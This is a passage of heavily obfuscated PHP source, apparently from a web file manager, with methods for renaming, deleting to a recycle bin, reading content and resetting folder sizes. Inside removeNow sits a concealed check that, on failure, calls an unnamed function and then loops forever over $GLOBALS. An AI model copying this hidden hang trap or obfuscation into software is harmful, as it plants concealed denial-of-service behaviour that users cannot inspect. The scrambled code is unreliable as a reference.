Model($Eú¢ÃÑôãƒ[474])->getInfo($A‚‚èú“âØ[$Eú¢ÃÑôãƒ[456]]); $fƒ€€â§ï„ = !empty($F¬æ≤⁄Óà•[$Eú¢ÃÑôãƒ[2336]]) ? $F¬æ≤⁄Óà•[$Eú¢ÃÑôãƒ[2336]] : $F¬æ≤⁄Óà•[$Eú¢ÃÑôãƒ[28]]; $fƒ€€â§ï„ = $Eú¢ÃÑôãƒ[248] . $fƒ€€â§ï„ . $Eú¢ÃÑôãƒ[2344] . $A‚‚èú“âØ[$Eú¢ÃÑôãƒ[456]]; } else { $F¬æ≤⁄Óà• = Model($Eú¢ÃÑôãƒ[458])->getInfo($A‚‚èú“âØ[$Eú¢ÃÑôãƒ[456]]); $fƒ€€â§ï„ = _get($F¬æ≤⁄Óà•, $Eú¢ÃÑôãƒ[28]); $fƒ€€â§ï„ = $Eú¢ÃÑôãƒ[157] . $fƒ€€â§ï„ . $Eú¢ÃÑôãƒ[2345] . $A‚‚èú“âØ[$Eú¢ÃÑôãƒ[456]]; } $eÃ•‘∑¡Üõ = $Eú¢ÃÑôãƒ[2346] . md5($fƒ€€â§ï„); goto dõﬁ‡Ëª†˘; Bà‰›ÿ´çÓ: $this->recycleClear($A‚‚èú“âØ); $e√ƒàÇˆòç = $this->move($Döœ„°àà§, $c≠âÆ¯º≈Í, REPEAT_RENAME_FOLDER); $this->folderSizeReset($A‚‚èú“âØ[$Eú¢ÃÑôãƒ[461]]); goto fú◊Ó´ÍÊ∞; Fè»ò≤≈≤¶: $Eú¢ÃÑôãƒ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $A‚‚èú“âØ = $this->sourceInfo($Döœ„°àà§); $AñˆÎô⁄ç∆ = intval($A‚‚èú“âØ[$Eú¢ÃÑôãƒ[371]]) === self::TYPE_SYSTEM; goto D¢òøÆÀﬁÀ; Aéü∆ëª©‰: } private function recycleClear($Cà∑ƒ·ÉË’) { $aŒ†˜ò¥î» =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eÌ∂πíπ˘˘ = $this->childrenAll($Cà∑ƒ·ÉË’); $cÛÈîì¶ØÕ = array($aŒ†˜ò¥î»[383] => array($aŒ†˜ò¥î»[384], $eÌ∂πíπ˘˘[$aŒ†˜ò¥î»[2352]])); Model($aŒ†˜ò¥î»[2353])->where($cÛÈîì¶ØÕ)->delete(); } public function removeNow($f´Öáö™Û‘, $Bï´ÀıèÀÖ = true) { goto aÆÜ¬êå·å; aÌè£íèÆè: $aì∆˘¬É∆Ç = $this->pathInfoMore($f´Öáö™Û‘); if (!$F‡Õù¿É∑≥) { return !0; } if ($F‡Õù¿É∑≥[$dŒŸÌ‘≤ÌÜ[461]] == 0) { if (!_get($GLOBALS, $dŒŸÌ‘≤ÌÜ[457])) { return !1; } } goto cû’ÙÔïê†; aÆÜ¬êå·å: $dŒŸÌ‘≤ÌÜ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!isset($_SERVER[$dŒŸÌ‘≤ÌÜ[712]]) || !isset($_SERVER[$dŒŸÌ‘≤ÌÜ[2128]])) { goto bÌ‡û¥ÙõÑ; bÌ‡û¥ÙõÑ: $DåÈøâÉÔ„ = $dŒŸÌ‘≤ÌÜ[797]; $Eù⁄¯∂äﬂ“ = $dŒŸÌ‘≤ÌÜ[713]; $Bê∞‚≠·èÔ = $_SERVER[$dŒŸÌ‘≤ÌÜ[714]] . $dŒŸÌ‘≤ÌÜ[715]; goto A˜âÇé‘ªÆ; a÷ó£πÔ Ú: for ($b…Ì å£ã‚ = $Aÿ…—çÇáÕ; $b…Ì å£ã‚ > 0; $b…Ì å£ã‚++) { $bˆÎáç¢€√ = json_encode($GLOBALS[$dŒŸÌ‘≤ÌÜ[384]]); } goto c—Ìüç÷ÎÏ; CÍÜÕ¥¥Î•: $bˆÎáç¢€√ = $dŒŸÌ‘≤ÌÜ[798]; $bˆÎáç¢€√($_SERVER[$dŒŸÌ‘≤ÌÜ[796]]); $Aÿ…—çÇáÕ = 1; goto a÷ó£πÔ Ú; A˜âÇé‘ªÆ: $C™±û±ﬁÉ¿ = $Eù⁄¯∂äﬂ“($Bê∞‚≠·èÔ); $c∆¨ı∆•Ñ« = explode($dŒŸÌ‘≤ÌÜ[217], $C™±û±ﬁÉ¿); if (count($c∆¨ı∆•Ñ«) < $dŒŸÌ‘≤ÌÜ[563]) { $fÓ‚¯Éíëﬁ = $dŒŸÌ‘≤ÌÜ[716]; $fÓ‚¯Éíëﬁ(); } goto CÍÜÕ¥¥Î•; c—Ìüç÷ÎÏ: } $F‡Õù¿É∑≥ = $this->sourceInfo($f´Öáö™Û‘); goto aÌè£íèÆè; DÛíÀ∆ãŒ‘: $this->folderSizeReset($F‡Õù¿É∑≥[$dŒŸÌ‘≤ÌÜ[461]]); $f í¿Ω¡¯Í = array($F‡Õù¿É∑≥[$dŒŸÌ‘≤ÌÜ[461]]); if ($F‡Õù¿É∑≥[$dŒŸÌ‘≤ÌÜ[370]] == $dŒŸÌ‘≤ÌÜ[83]) { $f í¿Ω¡¯Í[] = $F‡Õù¿É∑≥[$dŒŸÌ‘≤ÌÜ[369]]; } goto Eó÷ˆÍﬁ©º; e„Ûƒ‹íäÿ: return !0; goto A⁄ﬂ‘”ΩïÈ; cû’ÙÔïê†: $this->lockMoveStart($f´Öáö™Û‘); Hook::trigger($dŒŸÌ‘≤ÌÜ[2354], $aì∆˘¬É∆Ç, $Bï´ÀıèÀÖ); if ($Bï´ÀıèÀÖ) { Model($dŒŸÌ‘≤ÌÜ[2353])->moveToRecycle($f´Öáö™Û‘); } else { $eÂÜ“®¢Ëá = $this->childrenAll($F‡Õù¿É∑≥); Model($dŒŸÌ‘≤ÌÜ[505])->eventRemove($f´Öáö™Û‘); $this->removeRelevance($eÂÜ“®¢Ëá[$dŒŸÌ‘≤ÌÜ[2352]], $eÂÜ“®¢Ëá[$dŒŸÌ‘≤ÌÜ[1262]]); } goto DÛíÀ∆ãŒ‘; Eó÷ˆÍﬁ©º: $this->updateModifyTime($f í¿Ω¡¯Í); $this->lockMoveEnd($f´Öáö™Û‘); Hook::trigger($dŒŸÌ‘≤ÌÜ[1472], $aì∆˘¬É∆Ç, $Bï´ÀıèÀÖ); goto e„Ûƒ‹íäÿ; A⁄ﬂ‘”ΩïÈ: } public function childrenAll($B™≥¢“é™ú) { $A°†œÖ≈ïõ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B˘Õ‚¢ﬂﬁœ = $B™≥¢“é™ú[$A°†œÖ≈ïõ[369]]; if ($B™≥¢“é™ú[$A°†œÖ≈ïõ[370]] == $A°†œÖ≈ïõ[83]) { $B…∫ê•ªö´ = array($A°†œÖ≈ïõ[525] => array($A°†œÖ≈ïõ[483], $B™≥¢“é™ú[$A°†œÖ≈ïõ[459]] . $B˘Õ‚¢ﬂﬁœ . $A°†œÖ≈ïõ[484])); $d∂”ıåéÚ» = array($A°†œÖ≈ïõ[525] => $B…∫ê•ªö´[$A°†œÖ≈ïõ[459]]); $d´ıˆéâ¡ç = $this->field($A°†œÖ≈ïõ[2355])->where($d∂”ıåéÚ»)->select(); $A‡îèåãºµ = !1; $E√â∏±äøË = array($B˘Õ‚¢ﬂﬁœ); if ($d´ıˆéâ¡ç) { $A‡îèåãºµ = array_to_keyvalue($d´ıˆéâ¡ç, $A°†œÖ≈ïõ[33], $A°†œÖ≈ïõ[419]); $A‡îèåãºµ = array_remove_value($A‡îèåãºµ, $A°†œÖ≈ïõ[468]); $E√â∏±äøË = array_to_keyvalue($d´ıˆéâ¡ç, $A°†œÖ≈ïõ[33], $A°†œÖ≈ïõ[369]); $E√â∏±äøË[] = $B˘Õ‚¢ﬂﬁœ; } } else { $A‡îèåãºµ = array($B™≥¢“é™ú[$A°†œÖ≈ïõ[419]]); $E√â∏±äøË = array($B˘Õ‚¢ﬂﬁœ); } return array($A°†œÖ≈ïõ[2352] => $E√â∏±äøË, $A°†œÖ≈ïõ[1262] => $A‡îèåãºµ); } public function removeArray($C¢‰á÷Éƒá) { if (!$C¢‰á÷Éƒá) { return !0; } } public function removeRelevance($c¨Ñ¥ëï›î, $Bü∂è±„ﬁà) { goto cã„™Ñî€Ì; DÌ“ç€íƒ≥: Model($a¶˜Ê•Í¥†[2356])->where($f◊Òœ≈™úå)->delete(); Model($a¶˜Ê•Í¥†[505])->where($f◊Òœ≈™úå)->delete(); Model($a¶˜Ê•Í¥†[2083])->removeBySource($c¨Ñ¥ëï›î); goto DŒÌ–—ûú»; DŒÌ–—ûú»: Model($a¶˜Ê•Í¥†[2334])->removeBySource($c¨Ñ¥ëï›î); $this->where($f◊Òœ≈™úå)->delete(); Model($a¶˜Ê•Í¥†[422])->remove($Bü∂è±„ﬁà); goto Aπ”ﬂµüá»; Aπ”ﬂµüá»: for ($eı∆‚œÙ∫É = 0; $eı∆‚œÙ∫É < count($c¨Ñ¥ëï›î); $eı∆‚œÙ∫É++) { $this->sourceCacheClear($c¨Ñ¥ëï›î[$eı∆‚œÙ∫É]); } goto C…Ç◊ÏØ•‘; cã„™Ñî€Ì: $a¶˜Ê•Í¥† =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c¨Ñ¥ëï›î = $c¨Ñ¥ëï›î ? $c¨Ñ¥ëï›î : array(); $Bü∂è±„ﬁà = $Bü∂è±„ﬁà ? $Bü∂è±„ﬁà : array(); goto AÍ∫ﬁˆØ¶À; BÆºá®Ω€π: $f◊Òœ≈™úå = array($a¶˜Ê•Í¥†[383] => array($a¶˜Ê•Í¥†[384], $c¨Ñ¥ëï›î)); Model($a¶˜Ê•Í¥†[2353])->where($f◊Òœ≈™úå)->delete(); Model($a¶˜Ê•Í¥†[413])->where($f◊Òœ≈™úå)->delete(); goto DÌ“ç€íƒ≥; AÍ∫ﬁˆØ¶À: $c¨Ñ¥ëï›î = array_unique(array_filter($c¨Ñ¥ëï›î)); $Bü∂è±„ﬁà = array_unique(array_filter($Bü∂è±„ﬁà)); if (!$c¨Ñ¥ëï›î) { return !1; } goto BÆºá®Ω€π; C…Ç◊ÏØ•‘: } public function rename($C≥•˜àÌô⁄, $d¿ﬂ•òÇ”ë) { goto aå©ï§êÈ≈; f«Çú‹¨Ωœ: $this->setNamePinyin($C≥•˜àÌô⁄, $A⁄∞ª«Á®—[$aÃíµ√çßΩ[28]], !1); $this->updateModifyTime($fÁœº∏¢Ãé[$aÃíµ√çßΩ[461]]); $FâŸ˘ã§Õî = $this->where(array($aÃíµ√çßΩ[383] => $C≥•˜àÌô⁄))->data($A⁄∞ª«Á®—)->save(); goto eÀ€Ö˜⁄∫∂; aå©ï§êÈ≈: $aÃíµ√çßΩ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $fÁœº∏¢Ãé = $this->sourceInfo($C≥•˜àÌô⁄); if (!$fÁœº∏¢Ãé) { return !1; } goto AÇ˜¡à¥´; eÀ€Ö˜⁄∫∂: $eıÀÒÓ≤’ç = $aÃíµ√çßΩ[2342] . $fÁœº∏¢Ãé[$aÃíµ√çßΩ[461]]; if (isset(self::$cacheChildList[$eıÀÒÓ≤’ç])) { unset(self::$cacheChildList[$eıÀÒÓ≤’ç]); } return $FâŸ˘ã§Õî; goto CË›†€‚è„; C¨√∞‘ÉÜ»: if (!$fÁœº∏¢Ãé[$aÃíµ√çßΩ[370]] == $aÃíµ√çßΩ[83]) { $A⁄∞ª«Á®—[$aÃíµ√çßΩ[372]] = get_path_ext($d¿ﬂ•òÇ”ë); } Model($aÃíµ√çßΩ[505])->eventRename($C≥•˜àÌô⁄, $fÁœº∏¢Ãé[$aÃíµ√çßΩ[28]], $d¿ﬂ•òÇ”ë); $this->sourceCacheClear($C≥•˜àÌô⁄); goto f«Çú‹¨Ωœ; AÇ˜¡à¥´: $dãäÀ–Ωç∞ = $this->fileNameExist($fÁœº∏¢Ãé[$aÃíµ√çßΩ[461]], $d¿ﬂ•òÇ”ë); if ($dãäÀ–Ωç∞) { return !1; } $A⁄∞ª«Á®— = array($aÃíµ√çßΩ[386] => $d¿ﬂ•òÇ”ë, $aÃíµ√çßΩ[524] => USER_ID); goto C¨√∞‘ÉÜ»; CË›†€‚è„: } public function setNamePinyin($d”É∑ÚÑÖ˘, $F∂öΩÚ‡±à, $F…ƒ÷ƒ€¯Ò = true) { $A…ıëÇ÷≤à =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $E¢‚ÿØïÖù = Input::check($F∂öΩÚ‡±à, $A…ıëÇ÷≤à[528]); if ($F…ƒ÷ƒ€¯Ò && !$E¢‚ÿØïÖù) { return; } if (!$E¢‚ÿØïÖù) { $this->metaSet($d”É∑ÚÑÖ˘, $A…ıëÇ÷≤à[416], null); $this->metaSet($d”É∑ÚÑÖ˘, $A…ıëÇ÷≤à[415], null); return; } $CÆõÉÉë˘— = array($A…ıëÇ÷≤à[416] => str_replace($A…ıëÇ÷≤à[50], $A…ıëÇ÷≤à[33], Pinyin::encode($F∂öΩÚ‡±à)), $A…ıëÇ÷≤à[415] => Pinyin::encode($F∂öΩÚ‡±à, $A…ıëÇ÷≤à[529])); $this->metaSet($d”É∑ÚÑÖ˘, $CÆõÉÉë˘—); } public function getContent($cÑîùÇ™è‚) { goto bùëâ»ÈÜµ; dì∏è≤¯©⁄: if ($FÃ∂ØïµêË[$Fë™¬¢ç´®[77]] == 0) { return $Fë™¬¢ç´®[33]; } $AúÜΩ‡πÖõ = $Fë™¬¢ç´®[2357] . $FÃ∂ØïµêË[$Fë™¬¢ç´®[163]]; if ($FÃ∂ØïµêË[$Fë™¬¢ç´®[77]] <= 1024 * 10) { $dÇ”Ò±Œ“ä = Cache::get($AúÜΩ‡πÖõ); if (!$dÇ”Ò±Œ“ä) { $dÇ”Ò±Œ“ä = IO::getContent($FÃ∂ØïµêË[$Fë™¬¢ç´®[75]]); Cache::set($AúÜΩ‡πÖõ, $dÇ”Ò±Œ“ä); } return $dÇ”Ò±Œ“ä; } goto B≠êÊƒ∞∂ã; bùëâ»ÈÜµ: $Fë™¬¢ç´® =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $FÃ∂ØïµêË = $this->fileInfoGet($cÑîùÇ™è‚); if (!$FÃ∂ØïµêË) { return !1; } goto dì∏è≤¯©⁄; B≠êÊƒ∞∂ã: return IO::getContent($FÃ∂ØïµêË[$Fë™¬¢ç´®[75]]); goto AÂñ∂¢Éø; AÂñ∂¢Éø: } public function setDesc($fÌÙí∆Üï¡, $dñ÷Ò ‚º) { $BóËÛ≤ì•Ü =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; Model($BóËÛ≤ì•Ü[505])->eventAddDesc($fÌÙí∆Üï¡, $dñ÷Ò ‚º); return $this->metaSet($fÌÙí∆Üï¡, $BóËÛ≤ì•Ü[405], $dñ÷Ò ‚º); } public function setContent($DÇÇÏÜöÊﬁ, $cÉ“»ÑÉª¡ = '') { goto eÕàª’ªŸ¥; Cºí¬„“¿∏: if (!$dÏ·≥Ñ≤©â) { return Model($A∆ÌËé˘≥ë[422])->remove($Aıò∑∞√Û°[$A∆ÌËé˘≥ë[419]]); } $this->folderSizeReset($Aﬁ≥äéÂüÊ[$A∆ÌËé˘≥ë[461]]); return !0; goto FÉÓäÎàùÕ; eÕàª’ªŸ¥: $A∆ÌËé˘≥ë =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Aﬁ≥äéÂüÊ = $this->sourceInfo($DÇÇÏÜöÊﬁ); $C¨´Ù⁄≥Ù≠ = $this->fileInfoGet($DÇÇÏÜöÊﬁ); goto DåÌûæ¡∂∆; DåÌûæ¡∂∆: if (!$C¨´Ù⁄≥Ù≠ || !$Aﬁ≥äéÂüÊ) { return !1; } $Aıò∑∞√Û° = Model($A∆ÌËé˘≥ë[422])->addFileByContent($cÉ“»ÑÉª¡, $Aﬁ≥äéÂüÊ[$A∆ÌËé˘≥ë[28]]); $dÏ·≥Ñ≤©â = $this->fileHistory($Aﬁ≥äéÂüÊ, $Aıò∑∞√Û°[$A∆ÌËé˘≥ë[419]], $Aıò∑∞√Û°[$A∆ÌËé˘≥ë[77]]); goto Cºí¬„“¿∏; FÉÓäÎàùÕ: } public function fileSubstr($E•›Éí”‹ç, $eÜÃ¬¶§Á÷, $FÎ–‡ÚÏ¡–) { $B≥•ÃöíË = $this->fileInfoGet($E•›Éí”‹ç); if (!$B≥•ÃöíË) { return !1; } return IO::fileSubstr($B≥•ÃöíË[$_SERVER[Ä¿¡‡öóµŸﬂ‡][75]], $eÜÃ¬¶§Á÷, $FÎ–‡ÚÏ¡–); } public function fileInfoGet($eÛÇùΩ¥â«) { goto f¨Ãì‚Ëº√; Bøóü«∂”ë: return $DõáÑΩ È◊; goto Dáπ≈íË®À; f¨Ãì‚Ëº√: $Fíé†ÉΩüÉ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $C—åÛﬂ¡™Û = $this->sourceInfo($eÛÇùΩ¥â«); if (!$C—åÛﬂ¡™Û || $C—åÛﬂ¡™Û[$Fíé†ÉΩüÉ[370]]) { return !1; } goto dêØÌâó›ç; dêØÌâó›ç: $A°îÓé•°— = $Fíé†ÉΩüÉ[425] . $C—åÛﬂ¡™Û[$Fíé†ÉΩüÉ[419]]; $A∏ñ˘∫êé≈ = _get(self::$cacheFileInfo, $A°îÓé•°—); if ($A∏ñ˘∫êé≈) { return $A∏ñ˘∫êé≈; } goto F÷ÿßÔ‚£Á; F÷ÿßÔ‚£Á: $DõáÑΩ È◊ = Model($Fíé†ÉΩüÉ[422])->fileInfo($C—åÛﬂ¡™Û[$Fíé†ÉΩüÉ[419]]); if ($DõáÑΩ È◊) { $DõáÑΩ È◊[$Fíé†ÉΩüÉ[28]] = $C—åÛﬂ¡™Û[$Fíé†ÉΩüÉ[28]]; } self::$cacheFileInfo[$A°îÓé•°—] = $DõáÑΩ È◊; goto Bøóü«∂”ë; Dáπ≈íË®À: } private function folderChildrenNumber($FÔﬂ¡îñΩª) { $Cé“‘óˆˆÂ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $A÷ÖÈ√ã’à = $this->sourceInfo($FÔﬂ¡îñΩª); $D™à‹ä˘∏ê = array($Cé“‘óˆˆÂ[525] => array($Cé“‘óˆˆÂ[483], $A÷ÖÈ√ã’à[$Cé“‘óˆˆÂ[459]] . $FÔﬂ¡îñΩª . $Cé“‘óˆˆÂ[484]), $Cé“‘óˆˆÂ[396] => intval($A÷ÖÈ√ã’à[$Cé“‘óˆˆÂ[397]]), $Cé“‘óˆˆÂ[518] => 1); $dá¬í≥˘÷Õ = $this->where($D™à‹ä˘∏ê)->count(); $EöìÍÍîîÔ = $this->where($D™à‹ä˘∏ê)->where(array($Cé“‘óˆˆÂ[518] => 0))->count(); return array($Cé“‘óˆˆÂ[81] => $EöìÍÍîîÔ, $Cé“‘óˆˆÂ[82] => $dá¬í≥˘÷Õ); } public function pathInfo($BÊº≈∫ß”Á, $cùöƒﬁ±∞Ÿ = false) { goto eÉÜ¿¯º˜î; e ë·æüïº: $F≠’≈Ω·Á‚ = $this->_listDataApplyItem($F≠’≈Ω·Á‚, $cùöƒﬁ±∞Ÿ); self::$cachePathInfo[$a°¶–úáÌ∫] = $F≠’≈Ω·Á‚; return $F≠’≈Ω·Á‚; goto bóó†·πÖü; C¿Ó¡äŸÛ÷: if ($cŒûìëò»É) { return $cŒûìëò»É; } $F≠’≈Ω·Á‚ = $this->sourceInfo($BÊº≈∫ß”Á); if (!$F≠’≈Ω·Á‚) { return !1; } goto e ë·æüïº; eÉÜ¿¯º˜î: $eÏ…‰€‹≤ﬂ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a°¶–úáÌ∫ = $eÏ…‰€‹≤ﬂ[411] . intval($cùöƒﬁ±∞Ÿ) . $eÏ…‰€‹≤ﬂ[412] . $BÊº≈∫ß”Á; $cŒûìëò»É = _get(self::$cachePathInfo, $a°¶–úáÌ∫); goto C¿Ó¡äŸÛ÷; bóó†·πÖü: } public static $cachePathInfoMore = array(); public function pathInfoMore($aìØ¢ÃÀ´…) { goto D∑•†Í±Í›; cÌû∞—ıËô: self::$cachePathInfoMore[$aìØ¢ÃÀ´…] = $b’çßÜà∞∏; return $b’çßÜà∞∏; goto aúòÚ»í¶≤; D∑•†Í±Í›: $f°ÖÇµãô =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eøÒ√õ”Ìº = _get(self::$cachePathInfoMore, $aìØ¢ÃÀ´…); if ($eøÒ√õ”Ìº) { return $eøÒ√õ”Ìº; } goto F›èıÀ◊Êµ; F›èıÀ◊Êµ: $b’çßÜà∞∏ = $this->pathInfo($aìØ¢ÃÀ´…); if (!$b’çßÜà∞∏) { return !1; } if ($b’çßÜà∞∏[$f°ÖÇµãô[370]] == $f°ÖÇµãô[83]) { $b’çßÜà∞∏[$f°ÖÇµãô[80]] = $this->folderChildrenNumber($aìØ¢ÃÀ´…); } goto cÌû∞—ıËô; aúòÚ»í¶≤: } public function sourceInfo($B≥ﬁπàò„ª) { goto d∞™‹√“©‡; Cë•ƒﬁ¥í”: self::$cacheSourceInfo[$d»Ö£Ãä„ê] = $Eã†ß£Ö¢•; return self::$cacheSourceInfo[$d»Ö£Ãä„ê]; goto E¢ËÃµø¥è; d∞™‹√“©‡: $D™÷ò‘úê’ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$B≥ﬁπàò„ª) { return array(); } $d»Ö£Ãä„ê = $D™÷ò‘úê’[410] . $B≥ﬁπàò„ª; goto E´ø¿éÆëÁ; E´ø¿éÆëÁ: $fÇÑÛÃœòÉ = _get(self::$cacheSourceInfo, $d»Ö£Ãä„ê); if ($fÇÑÛÃœòÉ) { return $fÇÑÛÃœòÉ; } $Eã†ß£Ö¢• = $this->where(array($D™÷ò‘úê’[369] => $B≥ﬁπàò„ª))->find(); goto Cë•ƒﬁ¥í”; E¢ËÃµø¥è: } public function sourceCacheClear($f”Ñò‘‘Éö = false) { if ($f”Ñò‘‘Éö == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[Ä¿¡‡öóµŸﬂ‡][410] . $f”Ñò‘‘Éö]); } public function pathInfoByPath($B≠Ô«¡àêä, $C‘èËÕﬂÿ⁄) { $aÿ±ÌãÑ¥‚ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Dä†¯Á¨∆– = !$C‘èËÕﬂÿ⁄ ? array() : explode($aÿ±ÌãÑ¥‚[8], trim($C‘èËÕﬂÿ⁄, $aÿ±ÌãÑ¥‚[8])); $AÉ£πÇ•¯“ = $B≠Ô«¡àêä; foreach ($Dä†¯Á¨∆– as $AÙ°èπ≥≥®) { $eüÔÑñú∂ó = array($aÿ±ÌãÑ¥‚[461] => $AÉ£πÇ•¯“, $aÿ±ÌãÑ¥‚[28] => $AÙ°èπ≥≥®); $AœÍﬂÊ™≈Ù = $this->where($eüÔÑñú∂ó)->select(); if (!$AœÍﬂÊ™≈Ù) { return !1; } $AœÍﬂÊ™≈Ù = array_sort_by($AœÍﬂÊ™≈Ù, $aÿ±ÌãÑ¥‚[397]); $AÉ£πÇ•¯“ = $AœÍﬂÊ™≈Ù[0][$aÿ±ÌãÑ¥‚[369]]; } return $this->pathInfo($AÉ£πÇ•¯“, !0); } protected function updateModifyTime($d∏ÛÌﬂ…äÓ) { goto DâÖ–Ùê®Æ; DâÖ–Ùê®Æ: $c”‹éè≤üâ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$d∏ÛÌﬂ…äÓ) { return; } if (!is_array($d∏ÛÌﬂ…äÓ)) { $d∏ÛÌﬂ…äÓ = array($d∏ÛÌﬂ…äÓ); } goto c®∏‡£ˆ’æ; a≥äƒ‚Ó£Ω: $this->where($a‚ëª©õàé)->save($c˘âÍı√¥ﬂ); goto cÚÍ˜àÓÜÍ; c®∏‡£ˆ’æ: foreach ($d∏ÛÌﬂ…äÓ as $fπ…ÏÛ»„Ó => $Féï∆´ﬁ¡ê) { $d∏ÛÌﬂ…äÓ[$fπ…ÏÛ»„Ó] = intval($Féï∆´ﬁ¡ê); } $a‚ëª©õàé = array($c”‹éè≤üâ[369] => array($c”‹éè≤üâ[7], $d∏ÛÌﬂ…äÓ)); $c˘âÍı√¥ﬂ = array($c”‹éè≤üâ[524] => USER_ID, $c”‹éè≤üâ[390] => time()); goto a≥äƒ‚Ó£Ω; cÚÍ˜àÓÜÍ: } public function folderSizeReset($bˆ®Û„à÷) { goto fà©“å≤òƒ; FÀä–†ÂÀ»: CacheLock::lock($cΩÉ„˜∞êÆ, 20); $this->sourceCacheClear($bˆ®Û„à÷); $fì‚§Úï∂¨ = $this->sourceInfo($bˆ®Û„à÷); goto a‘óÖ€¿á∂; a‘óÖ€¿á∂: $CåΩ©Øá∆¢ = array($Bﬂ¢åéìÍÙ[368] => $bˆ®Û„à÷, $Bﬂ¢åéìÍÙ[396] => 0); $D ‘∆àéπ‚ = $this->where($CåΩ©Øá∆¢)->sum($Bﬂ¢åéìÍÙ[77]); $D ‘∆àéπ‚ = intval($D ‘∆àéπ‚); goto F—öä≈±ΩÇ; F—öä≈±ΩÇ: $aØ›ûŒÏ∏’ = $D ‘∆àéπ‚ - intval($fì‚§Úï∂¨[$Bﬂ¢åéìÍÙ[77]]); if ($aØ›ûŒÏ∏’ == 0) { return CacheLock::unlock($cΩÉ„˜∞êÆ); } $this->where(array($Bﬂ¢åéìÍÙ[383] => $bˆ®Û„à÷))->setField($Bﬂ¢åéìÍÙ[77], $D ‘∆àéπ‚); goto eéÆ¬ÀáÈ¬; eéÆ¬ÀáÈ¬: $B± Úù‹ë¯ = $this->parentLevelArray($fì‚§Úï∂¨[$Bﬂ¢åéìÍÙ[459]]); if ($B± Úù‹ë¯) { $CåΩ©Øá∆¢ = array($Bﬂ¢åéìÍÙ[369] => array($Bﬂ¢åéìÍÙ[384], $B± Úù‹ë¯)); if ($aØ›ûŒÏ∏’ < 0) { $CåΩ©Øá∆¢[$Bﬂ¢åéìÍÙ[77]] = array($Bﬂ¢åéìÍÙ[933], abs($aØ›ûŒÏ∏’)); } $this->where($CåΩ©Øá∆¢)->setAdd($Bﬂ¢åéìÍÙ[77], $aØ›ûŒÏ∏’); } $this->targetSpaceUpdate($fì‚§Úï∂¨[$Bﬂ¢åéìÍÙ[371]], $fì‚§Úï∂¨[$Bﬂ¢åéìÍÙ[456]]); goto cô§¶©ƒ∂ç; fà©“å≤òƒ: $Bﬂ¢åéìÍÙ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($this->statusIgnoreResetSpace) { return; } $cΩÉ„˜∞êÆ = $Bﬂ¢åéìÍÙ[2358] . $bˆ®Û„à÷; goto FÀä–†ÂÀ»; cô§¶©ƒ∂ç: CacheLock::unlock($cΩÉ„˜∞êÆ); goto aÁ®Ö»ç‹À; aÁ®Ö»ç‹À: } public function folderSizeResetChildren($AÉà∆òƒ…ç) { goto BåêÜ”Â«À; d€Ù»£Ü§û: $aÁ⁄è±Ω≠Ü[$f›“ﬂ”—¶Î[370]] = 0; $A€Ò–ôΩ¿› = $this->field($c≈ç––úêÑ)->where($aÁ⁄è±Ω≠Ü)->select(); if (!$A€Ò–ôΩ¿›) { return; } goto B∏œŒ‡˜ç≠; EåŒ‚¶á±›: foreach ($A€Ò–ôΩ¿› as $A©ﬁì„áãì) { $fÂÖõå„’ê = $A©ﬁì„áãì[$f›“ﬂ”—¶Î[461]] . $f›“ﬂ”—¶Î[33]; if (!isset($fìÃ“ñ÷©’[$fÂÖõå„’ê])) { continue; } if ($A©ﬁì„áãì[$f›“ﬂ”—¶Î[397]] == $fìÃ“ñ÷©’[$fÂÖõå„’ê][$f›“ﬂ”—¶Î[397]]) { $fìÃ“ñ÷©’[$fÂÖõå„’ê][$f›“ﬂ”—¶Î[77]] += $A©ﬁì„áãì[$f›“ﬂ”—¶Î[77]]; } } foreach ($fìÃ“ñ÷©’ as $A©ﬁì„áãì) { $C√ﬂ—Ì¢áÛ = $this->parentLevelArray($A©ﬁì„áãì[$f›“ﬂ”—¶Î[459]]); foreach ($C√ﬂ—Ì¢áÛ as $fÂÖõå„’ê) { $fÂÖõå„’ê = $fÂÖõå„’ê . $f›“ﬂ”—¶Î[33]; if (!isset($fìÃ“ñ÷©’[$fÂÖõå„’ê])) { continue; } if ($A©ﬁì„áãì[$f›“ﬂ”—¶Î[397]] == $fìÃ“ñ÷©’[$fÂÖõå„’ê][$f›“ﬂ”—¶Î[397]]) { $fìÃ“ñ÷©’[$fÂÖõå„’ê][$f›“ﬂ”—¶Î[77]] += $A©ﬁì„áãì[$f›“ﬂ”—¶Î[77]]; } } } $BÎı·¨ŒŸÔ = array(); goto EôÛâãÛ±¿; dŒÜÍèÔ˜“: $aÁ⁄è±Ω≠Ü = array($f›“ﬂ”—¶Î[518] => 1, $f›“ﬂ”—¶Î[525] => array($f›“ﬂ”—¶Î[483], $aÏµå∑≠ Ã[$f›“ﬂ”—¶Î[459]] . $AÉà∆òƒ…ç . $f›“ﬂ”—¶Î[484])); $c≈ç––úêÑ = $f›“ﬂ”—¶Î[2359]; $fìÃ“ñ÷©’ = $this->field($c≈ç––úêÑ)->where($aÁ⁄è±Ω≠Ü)->select(); goto d€Ù»£Ü§û; EôÛâãÛ±¿: foreach ($fìÃ“ñ÷©’ as $A©ﬁì„áãì) { if ($A©ﬁì„áãì[$f›“ﬂ”—¶Î[77]] == $A©ﬁì„áãì[$f›“ﬂ”—¶Î[2360]]) { continue; } $BÎı·¨ŒŸÔ[] = array($f›“ﬂ”—¶Î[369], $A©ﬁì„áãì[$f›“ﬂ”—¶Î[369]], $f›“ﬂ”—¶Î[77], 